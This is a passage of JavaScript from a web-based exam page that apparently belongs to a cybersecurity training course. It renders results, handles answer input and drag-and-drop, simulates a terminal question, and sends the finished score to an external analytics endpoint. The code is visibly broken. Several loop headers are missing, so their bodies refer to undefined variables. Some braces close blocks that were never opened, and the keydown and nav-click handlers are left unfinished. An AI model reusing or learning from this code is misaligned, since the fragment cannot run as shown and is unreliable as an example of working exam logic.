    '<div class="stat"><div class="v">'+EXAM.passMark+'%</div><div class="k">pass mark</div></div>'+

  h+='<h2>Per-theme progress</h2>';
  var th=themeProgress();

    h+='<div class="themebar"><div class="tl"><span>'+t+'</span><span>'+pc+'%</span></div><div class="tb"><div style="width:'+pc+'%"></div></div></div>';
  });
  h+='<h2>Detailed report</h2><p class="dim">Open any exercise to compare your answer with the correct one and read the explanation.</p>';

    var hintTxt = r.hint ? ' · hint −10%' : '';
    var lblTxt = r.status==="skipped" ? "SKIPPED · not counted" : (lbl==="full"?"FULL "+r.earned.toFixed(2)+"/"+q.pts : lbl==="partial"?"PARTIAL "+r.earned.toFixed(2)+"/"+q.pts+hintTxt : "ZERO 0/"+q.pts+hintTxt);
    h+='<details class="repex"'+(lbl==="zero"||r.status==="skipped"?" open":"")+'><summary><span class="lbl '+lbl+'">'+lblTxt+'</span><b>Q'+(pos+1)+' — '+esc(q.title)+'</b></summary><div class="repbody">'+
      '<h3>Your answer</h3>'+studentSummaryHTML(q,r)+

      '<div class="expl">'+q.exp+'</div></div></details>';
  });
  h+='<div class="btns"><button type="button" class="btn primary" data-act="retake" id="btnRetake">&#8635; Retake Exam</button></div></div>';
  byId("results").innerHTML=h;

/* ===================== events ===================== */
function handleAction(act,tgt,ev){
  var qi=S.order[S.cur], q=QUESTIONS[qi], rec=S.ans[q.id];
  if(act==="start"){ byId("intro").hidden=true; byId("top").hidden=false; byId("exam").hidden=false; byId("indwrap").hidden=false;
    S.started=true; startTimer(); renderQ(); window.scrollTo({top:0,behavior:"smooth"}); return; }
  if(act==="mclose"){ closeModal(); return; }
  if(act==="msubmit"){ finishExam("submit"); return; }
  if(act==="retake"){ retakeExam(); return; }
  if(act==="check"){ doCheck(); return; }
  if(act==="skip"){ doSkip(); return; }
  if(act==="hint"){ doHint(); return; }
  if(act==="revise"){ doRevise(); return; }
  if(act==="next"){ S.checkPause=false; updateChrome(); if(S.cur<QUESTIONS.length-1) gotoQ(S.cur+1); else openSubmitModal(); return; }
  if(act==="prev"){ if(S.cur>0) gotoQ(S.cur-1); return; }
  if(act==="run"){ var tin=byId("tin-"+q.id); if(tin&&tin.value.trim()){ runTerminal(q,rec,tin.value.trim()); } return; }
  if(act==="chip"){ chipClick(q,rec,tgt); return; }
  if(act==="drop"){ dropTo(q,rec,tgt); return; }
  if(act==="up"||act==="down"){ moveRow(q,rec,act==="up"?-1:1,Number(tgt.dataset.pos)); return; }
  if(act==="cls"){ var ri=Number(tgt.dataset.r); rec.val[ri]=Number(tgt.dataset.v);
    tgt.parentElement.querySelectorAll(".tbtn").forEach(function(b){ b.setAttribute("aria-pressed",String(Number(b.dataset.r)===ri&&Number(b.dataset.v)===rec.val[ri])); }); return; }
}
function handleInput(act,tgt){
  var qi=S.order[S.cur], q=QUESTIONS[qi], rec=S.ans[q.id];
  if(act==="tin"){ rec.val.cmd=tgt.value; return; }
  if(act==="lfilter"){ var f=tgt.value.toLowerCase();
    document.querySelectorAll("#exarea .logline").forEach(function(l){
      l.classList.toggle("off", f!=="" && l.textContent.toLowerCase().indexOf(f)<0); }); return; }
}
function handleChange(act,tgt){
  var qi=S.order[S.cur], q=QUESTIONS[qi], rec=S.ans[q.id];
  if(act==="opt"){ if(q.t==="qcm"){ rec.val=Number(tgt.value);
      document.querySelectorAll('#ansbody input[name="a-'+q.id+'"]').forEach(function(x){ x.closest(".opt").classList.toggle("sel",x.checked); }); }
    else { var set=new Set(rec.val||[]); if(tgt.checked) set.add(Number(tgt.value)); else set.delete(Number(tgt.value)); rec.val=Array.from(set); }
    return; }
  if(act==="popt"){ var pi=Number(tgt.dataset.part); rec.val[pi]=Number(tgt.value);
    document.querySelectorAll('#ansbody input[name="a-'+q.id+'-'+pi+'"]').forEach(function(x){ x.closest(".opt").classList.toggle("sel",x.checked); });
    if(q.seq){ var box=tgt.closest(".partsbox"); var next=box.nextElementSibling;
      if(next&&next.classList.contains("partsbox")) next.classList.remove("hiddenp"); }
    return; }
  if(act==="tsel"){ var r=Number(tgt.dataset.r); rec.val[r]=tgt.value===""?null:Number(tgt.value); return; }
  if(act==="bsel"){ rec.val[Number(tgt.dataset.b)]=tgt.value; return; }
}

/* ---------- drag & drop / click-to-place ---------- */
var selChip=null;
function chipClick(q,rec,tgt){
  if(rec.status==="checked") return;
  var oid=Number(tgt.dataset.oid);
  if(tgt.closest(".slot")){ /* placed chip in a match row: send back */
    var li=Number(tgt.closest(".slot").dataset.l);
    delete rec.val.pair[li]; tgt.closest(".slot").innerHTML=""; clearSel(); return;
  }
  if(tgt.closest(".dropzone")){ rec.val.bin[oid]=-1; tgt.remove(); clearSel(); return; }
  if(selChip===tgt){ clearSel(); return; }
  clearSel(); selChip=tgt; tgt.classList.add("sel"); tgt.setAttribute("aria-pressed","true");
}
function clearSel(){ if(selChip){ selChip.classList.remove("sel"); selChip.removeAttribute("aria-pressed"); selChip=null; } }
function dropTo(q,rec,tgt){
  if(!selChip||rec.status==="checked") return;
  var oid=Number(selChip.dataset.oid);
  var slot=tgt.classList.contains("slot")?tgt:tgt.closest(".slot");
  var zone=tgt.classList.contains("dropzone")?tgt:tgt.closest(".dropzone");
  if(slot&&tgt.closest(".mrow")){ var li=Number(slot.dataset.l);
    for(var k in rec.val.pair){ if(rec.val.pair[k]===oid) delete rec.val.pair[k]; }
    rec.val.pair[li]=oid; slot.appendChild(selChip); clearSel(); return; }
  if(zone){ var bi=Number(zone.dataset.bin); rec.val.bin[oid]=bi; zone.appendChild(selChip); clearSel(); return; }
}
function runTerminal(q,rec,cmd){
  rec.val.cmd=cmd;
  var out=byId("tout-"+q.id); if(!out) return;
  var ok=termAccept(q,cmd);
  out.textContent += "\n"+(q.term.prompt||"$")+" "+cmd+"\n";
  if(ok){ out.textContent += (q.term.out||"ok")+"\n"; rec.val.ok=true; }
  else { out.textContent += "(no output — the command produced nothing useful; check flags and target)\n"; rec.val.ok=false; }
  out.scrollTop=out.scrollHeight;
  var tin=byId("tin-"+q.id); if(tin){ tin.value=""; rec.val.cmd=cmd; }
}
function moveRow(q,rec,delta,pos){
  var list=rec.val.list, j=pos+delta;
  if(j<0||j>=list.length) return;
  var t=list[pos]; list[pos]=list[j]; list[j]=t;
  renderQ();
}

document.addEventListener("click",function(ev){
  var tgt=ev.target.closest("[data-act]");
  if(!tgt) return;
  var act=tgt.dataset.act;
  var passthrough=["opt","popt","tsel","bsel","tin","lfilter"];
  if(passthrough.indexOf(act)>=0) return;
  ev.preventDefault();
  if(act==="pause"){ pauseManual(); return; }
  if(act==="resume"){ pauseManual(); return; }
  if(act==="submit"){ openSubmitModal(); return; }
  if(tgt.closest("#exarea")||tgt.closest("#results")||tgt.closest("#mbox")||tgt.closest("#intro")||tgt.id==="btnResume"){ handleAction(act,tgt,ev); }
});
document.addEventListener("change",function(ev){
  var tgt=ev.target.closest("[data-act]"); if(!tgt) return;
  var act=tgt.dataset.act;
  if(act==="opt"||act==="popt"||act==="tsel"||act==="bsel") handleChange(act,tgt);
});
document.addEventListener("input",function(ev){
  var tgt=ev.target.closest("[data-act]"); if(!tgt) return;
  handleInput(tgt.dataset.act,tgt);
});
document.addEventListener("keydown",function(ev){
  if(ev.key==="Enter"&&ev.target&&ev.target.classList&&ev.target.classList.contains("tin")){
    ev.preventDefault(); var qi=S.order[S.cur],q=QUESTIONS[qi],rec=S.ans[q.id];

});
document.addEventListener("dragstart",function(ev){
  var c=ev.target.closest(".chip"); if(!c) return;
  ev.dataTransfer.setData("text/plain",c.dataset.oid); selChip=c; c.classList.add("sel");
});
document.addEventListener("dragover",function(ev){
  var z=ev.target.closest("[data-act='drop']"); if(z){ ev.preventDefault(); z.classList.add("over"); }
});
document.addEventListener("dragleave",function(ev){
  var z=ev.target.closest("[data-act='drop']"); if(z) z.classList.remove("over");
});
document.addEventListener("drop",function(ev){
  var z=ev.target.closest("[data-act='drop']"); if(!z) return;
  ev.preventDefault();
  var qi=S.order[S.cur], q=QUESTIONS[qi], rec=S.ans[q.id];
  if(!selChip){ var oid=Number(ev.dataTransfer.getData("text/plain")); selChip=document.querySelector('#exarea .chip[data-oid="'+oid+'"]'); }
  dropTo(q,rec,z);
  document.querySelectorAll(".over").forEach(function(x){x.classList.remove("over");});
});

byId("btnSubmit").addEventListener("click",function(){ openSubmitModal(); });
byId("btnResume").addEventListener("click",pauseManual);
document.getElementById("nav").addEventListener("click",function(ev){

function renderNavDots(){
  var h="";
  S.order.forEach(function(qi,pos){ h+='<button type="button" class="dot" data-pos="'+pos+'" aria-label="Go to question '+(pos+1)+'" title="Question '+(pos+1)+'">'+(pos+1)+'</button>'; });
  byId("nav").innerHTML=h;
  updateChrome();
}
</script>
<!-- cm-beacon: reports this attempt when the batch runs outside the hub -->
<script>
(function(){
  if (window.parent !== window) { return; }              /* inside the hub, exam-hub reports it */
  var m = /\/exercises\/(.+\.html)$/.exec(location.pathname);
  if (!m || !window.fetch) { return; }
  var path = 'exercises/' + m[1];
  var sent = false;
  window.addEventListener('message', function (e) {
    var d = e.data;
    if (typeof d === 'string') { try { d = JSON.parse(d); } catch (_) { return; } }
    if (!d || (d.type !== 'CYBERPULSE_SCORE' && d.type !== 'CYBERMASTERY_SCORE')) { return; }
    if (sent) { return; }
    var pct = (typeof d.percent === 'number') ? d.percent
      : ((typeof d.score === 'number' && typeof d.total === 'number' && d.total > 0)
          ? Math.round(d.score / d.total * 100) : null);
    if (pct === null) { return; }
    sent = true;
    fetch('https://cpa-engagement.marzouk-souhaieb.workers.dev/event', {
      method: 'POST', mode: 'cors', credentials: 'omit', keepalive: true,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        path: path, topicId: String(d.topicId || ''), percent: pct,
        passed: (typeof d.passed === 'boolean') ? d.passed : pct >= 70
      })
    })['catch'](function () { sent = false; });
  }, false);
})();
</script>
